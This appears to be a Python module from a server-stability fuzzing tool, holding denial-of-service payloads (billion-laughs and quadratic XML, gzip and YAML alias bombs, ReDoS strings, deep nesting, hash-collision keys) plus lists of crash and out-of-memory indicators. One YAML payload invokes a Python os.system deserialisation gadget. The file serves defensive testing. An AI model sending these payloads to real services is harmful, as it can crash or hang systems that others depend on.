"""Stability / DoS fuzzing payloads for R6.

These payloads push the server toward resource exhaustion, pathological
parser paths, and catastrophic regex backtracking. The goal is not to
bypass a check — it is to discover inputs that crash, hang, or balloon
memory usage, any of which is a service-stability threat.

Payload categories:

* ``memory_bomb``       — large strings / arrays that stress allocation
* ``deep_nesting``      — JSON / array structures deep enough to blow recursion
* ``redos``             — exponential-backtracking inputs against naive regex
* ``unicode_torture``   — combining marks, RTL overrides, surrogate pairs,
                          normalisation bombs
* ``numeric_extreme``   — values that overflow, underflow, or hit NaN paths
* ``slow_path``         — algorithmic-complexity attack inputs
* ``hash_collision``    — keys engineered to collide for HashDoS
* ``json_bomb``         — JSON structures that explode on parse
* ``xml_bomb``          — billion-laughs / quadratic XML expansion
* ``zip_bomb``          — compressed payloads that unzip into the gigabytes
* ``yaml_bomb``         — YAML alias / merge-key explosions
* ``pathological_regex``— malformed regex strings the server might compile
* ``schema_bomb``       — JSON Schema / OpenAPI structures with cycles
"""

from __future__ import annotations

import base64
from typing import Any

# Threshold above which a tool call is considered suspiciously slow. R6's
# stress analyser emits findings when observed latency crosses this.
SLOW_RESPONSE_THRESHOLD_SEC: float = 5.0


def _deep_dict(depth: int) -> dict:
    """Build a nested dict of the given depth (parser-bomb style)."""
    node: Any = {"leaf": True}
    for _ in range(depth):
        node = {"child": node}
    return node


def _deep_list(depth: int) -> list:
    node: Any = []
    for _ in range(depth):
        node = [node]
    return node


def _big_string(size: int) -> str:
    return "A" * size


def _hash_collision_keys(n: int) -> dict[str, int]:
    """Produce keys that hash to the same Python bucket for small dicts.

    Real HashDoS requires per-language collision sets; for cross-runtime
    fuzzing we approximate by emitting many keys with identical prefix /
    differing-suffix structure that older hash functions handle poorly.
    """
    return {f"k{i:08x}_aaaaaaaaaaaaaaaaaaaa": i for i in range(n)}


def _billion_laughs(depth: int = 9, fanout: int = 10) -> str:
    """Classic XML entity-expansion bomb (XXE / billion-laughs).

    Default sizing is conservative — most parsers refuse depth>=4 by
    default but vulnerable ones expand 10**9 entities.
    """
    lines = ['<?xml version="1.0"?>', "<!DOCTYPE lolz [", '  <!ENTITY a0 "lol">']
    for i in range(1, depth):
        lines.append(f'  <!ENTITY a{i} "{"&a" + str(i - 1) + ";" * fanout}">')
    lines.append("]>")
    lines.append(f"<lolz>&a{depth - 1};</lolz>")
    return "\n".join(lines)


def _quadratic_xml(repeats: int = 100_000) -> str:
    """Quadratic XML expansion — many references to one entity."""
    body = "&a;" * repeats
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE q [<!ENTITY a "' + ("A" * 1000) + '">]>\n'
        f"<q>{body}</q>"
    )


def _yaml_alias_bomb() -> str:
    """YAML merge-key / alias expansion bomb (CVE class against PyYAML/SnakeYAML)."""
    return (
        "a: &a [\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\"]\n"
        "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n"
        "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n"
        "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n"
        "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n"
        "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\n"
        "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n"
        "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\n"
        "i: [*h,*h,*h,*h,*h,*h,*h,*h,*h]\n"
    )


def _json_bomb_string(depth: int) -> str:
    """JSON deeply nested as a string — kills naive recursive parsers."""
    return "[" * depth + "]" * depth


def _json_dup_keys(n: int) -> str:
    """Duplicate-key JSON — some parsers store all copies in memory."""
    pairs = ",".join(f'"k":{i}' for i in range(n))
    return "{" + pairs + "}"


# A 10-byte input that decompresses to 10MB of zeros — handy for any
# server that auto-decompresses gzip/deflate request bodies.
def _gzip_bomb(size_mb: int = 10) -> bytes:
    """Build a gzip-compressed bytestring whose payload expands to size_mb MB."""
    import gzip
    import io

    raw = b"\0" * (size_mb * 1024 * 1024)
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as gz:
        gz.write(raw)
    return buf.getvalue()


PAYLOADS: dict[str, list[Any]] = {
    "memory_bomb": [
        _big_string(10_000),
        _big_string(100_000),
        _big_string(1_000_000),
        _big_string(10_000_000),
        ["x"] * 10_000,
        ["x"] * 100_000,
        ["x"] * 1_000_000,
        {"k" + str(i): i for i in range(1_000)},
        {"k" + str(i): i for i in range(10_000)},
        # String built from many tiny chunks — kills naive concat-in-loop code.
        ",".join(["a"] * 100_000),
        # Repeated unicode so byte-length >> char-length.
        "\U0001F600" * 100_000,
    ],
    "deep_nesting": [
        _deep_dict(100),
        _deep_dict(1_000),
        _deep_dict(10_000),
        _deep_list(100),
        _deep_list(1_000),
        _deep_list(10_000),
        # Mixed dict/list nesting.
        _deep_dict(500),
        _deep_list(500),
    ],
    "redos": [
        # Catastrophic backtracking on patterns like (a+)+$, (a|a)*, (a|aa)*.
        "a" * 30 + "!",
        "a" * 50 + "!",
        "a" * 100 + "!",
        "a" * 200 + "!",
        "a" * 500 + "!",
        # Evil regex trigger for email-validation style patterns.
        "a" * 30 + "@",
        "a" * 50 + "@a.",
        # Nested-quantifier killer.
        "x" * 40 + "y",
        # Classic ReDoS: alternation overlap, e.g. /(a|a)*$/.
        "a" * 80 + "b",
        # /(a*)*$/ — power-set explosion.
        "a" * 60 + "X",
        # URL-validation killer (commonly broken by attacker URLs).
        "http://" + "a" * 100,
        # Java-script URL parser ReDoS vector.
        "a" * 30 + "@a" * 30,
        # OWASP CRS rule #942100 trigger.
        "1" + "0" * 100 + "1",
    ],
    "unicode_torture": [
        # Zalgo — combining marks stacked on a single base char.
        "Z" + "\u0301" * 500,
        "Z" + "\u0301" * 5_000,
        # RTL override confusables.
        "admin\u202e" + "txt.exe",
        "\u202e" * 1_000,
        # Lone surrogate — invalid UTF-16.
        "\ud800",
        "\udfff",
        "\ud800" * 1_000,
        # Long combining chain forcing normalisation re-allocation.
        "e" + "\u0301" * 2_000,
        # Null / control char flood.
        "\x00" * 500,
        "\x07\x08\x0b\x0c" * 200,
        # Astral-plane spam.
        "\U0001F4A9" * 10_000,
        # NFKC bomb — characters that expand massively under normalisation.
        "\ufdfa" * 1_000,    # Arabic ligature → 18 chars on NFKC
        # Bidi-override chain.
        "\u202a\u202b\u202c\u202d\u202e" * 1_000,
        # Deep grapheme-cluster.
        "a" + "\u0301\u0302\u0303\u0304\u0305" * 500,
    ],
    "numeric_extreme": [
        2 ** 53,
        2 ** 53 + 1,
        2 ** 63 - 1,
        -(2 ** 63),
        2 ** 64,
        2 ** 128,
        2 ** 1024,
        2 ** 4096,
        1e308,
        -1e308,
        1e-308,
        5e-324,
        float("inf"),
        float("-inf"),
        float("nan"),
        # Decimal string forms that often kill big-int parsers.
        "9" * 10_000,
        "1" + "0" * 10_000,
        "1e999999",
        "-1e-999999",
    ],
    "slow_path": [
        list(range(10_000, 0, -1)),
        list(range(100_000, 0, -1)),
        ["collision"] * 5_000,
        ["collision"] * 50_000,
        [1, "1", 1.0, True, None] * 1_000,
        # Quicksort worst-case (already sorted).
        list(range(50_000)),
        # All-equal — kills naive partitioning.
        [42] * 50_000,
    ],
    "hash_collision": [
        _hash_collision_keys(1_000),
        _hash_collision_keys(10_000),
        _hash_collision_keys(50_000),
        # Real Python pre-3.4 collision was on numeric ints — many JSON parsers
        # still hash strings. Long-prefix-shared strings worsen hash quality.
        {("a" * 1000 + str(i)): i for i in range(1_000)},
    ],
    "json_bomb": [
        _json_bomb_string(1_000),
        _json_bomb_string(10_000),
        _json_dup_keys(10_000),
        _json_dup_keys(100_000),
        # Trailing whitespace storm — strict parsers tolerate, lenient stall.
        '{"a":1}' + " " * 1_000_000,
        # Comment storm in JSON5.
        "{" + "/* x */" * 100_000 + '"a":1}',
    ],
    "xml_bomb": [
        _billion_laughs(),
        _billion_laughs(depth=12, fanout=10),
        _quadratic_xml(),
        _quadratic_xml(repeats=500_000),
        # XInclude bomb.
        '<?xml version="1.0"?>'
        '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
        + '<xi:include href="/dev/zero" parse="text"/>' * 100
        + "</root>",
        # Long attribute parser bomb.
        '<a x="' + "A" * 1_000_000 + '"/>',
    ],
    "zip_bomb": [
        # base64-wrap the gzip bomb so it survives JSON transport
        base64.b64encode(_gzip_bomb(1)).decode(),
        base64.b64encode(_gzip_bomb(10)).decode(),
        # Famous 42.zip recursive bomb header bytes (truncated marker).
        b"PK\x05\x06" + b"\x00" * 18,
    ],
    "yaml_bomb": [
        _yaml_alias_bomb(),
        # YAML tag bomb — instantiates a huge object.
        "!!python/object/apply:os.system [\"" + "a" * 1000 + "\"]",
        # Merge-key cycle.
        "a: &a\n  <<: *a\n",
    ],
    "pathological_regex": [
        # Strings the server might compile as regex (e.g. for filtering).
        "(a+)+$",
        "(a|a)*$",
        "(a|aa)*$",
        "(a*)*$",
        "(.*a){25}$",
        "([a-zA-Z]+)*$",
        # Catastrophic-lookahead bomb.
        "(?=(a+))(?=\\1.*)",
        # Unicode-property explosion.
        "\\p{L}+\\p{L}+\\p{L}+",
    ],
    "schema_bomb": [
        # Self-referential JSON Schema.
        {"$ref": "#"},
        {"properties": {"a": {"$ref": "#/properties/a"}}},
        # Massive enum.
        {"enum": list(range(100_000))},
        # OpenAPI with circular allOf.
        {"allOf": [{"$ref": "#"}] * 100},
    ],
}


def generate_stability_payloads() -> list[tuple[str, Any]]:
    """Yield ``(category, value)`` pairs for every stability payload."""
    out: list[tuple[str, Any]] = []
    for category, values in PAYLOADS.items():
        for v in values:
            out.append((category, v))
    return out


# ---------------------------------------------------------------------------
# Response-side indicators
# ---------------------------------------------------------------------------

OOM_INDICATORS: list[str] = [
    "memoryerror",
    "out of memory",
    "cannot allocate memory",
    "allocation failed",
    "heap out of memory",
    "killed",
    "std::bad_alloc",
    "resource exhausted",
    "memory limit exceeded",
    "javascript heap out of memory",
    "fatal error: ineffective mark-compacts",
    "java.lang.outofmemoryerror",
    "gc overhead limit exceeded",
    "process out of memory",
]

STACK_OVERFLOW_INDICATORS: list[str] = [
    "stack overflow",
    "maximum call stack",
    "maximum recursion depth",
    "recursionerror",
    "segmentation fault",
    "segfault",
    "rangeerror: maximum call stack size exceeded",
    "stackoverflowerror",
    "fatal: stack",
]

TIMEOUT_INDICATORS: list[str] = [
    "timeout",
    "timed out",
    "deadline exceeded",
    "operation took too long",
    "request timeout",
    "etimedout",
    "context deadline exceeded",
    "execution timed out",
    "lock wait timeout",
]

PARSER_FAILURE_INDICATORS: list[str] = [
    "entity expansion",
    "exceeded the maximum allowed",
    "too many nested",
    "nesting depth",
    "recursive entity",
    "billion laughs",
    "json parse error",
    "yaml.parser",
    "yaml.composer",
    "xml.parsers.expat",
    "expat: parse error",
    "saxparseexception",
]

CRASH_INDICATORS: list[str] = [
    "core dumped",
    "abort trap",
    "sigabrt",
    "sigbus",
    "sigsegv",
    "sigfpe",
    "panic:",
    "fatal error",
    "process exited unexpectedly",
    "child process exited",
]


def looks_like_oom(response_text: str) -> bool:
    lower = response_text.lower()
    return any(ind in lower for ind in OOM_INDICATORS)


def looks_like_stack_overflow(response_text: str) -> bool:
    lower = response_text.lower()
    return any(ind in lower for ind in STACK_OVERFLOW_INDICATORS)


def looks_like_timeout(response_text: str) -> bool:
    lower = response_text.lower()
    return any(ind in lower for ind in TIMEOUT_INDICATORS)


def looks_like_parser_failure(response_text: str) -> bool:
    lower = response_text.lower()
    return any(ind in lower for ind in PARSER_FAILURE_INDICATORS)


def looks_like_crash(response_text: str) -> bool:
    lower = response_text.lower()
    return any(ind in lower for ind in CRASH_INDICATORS)
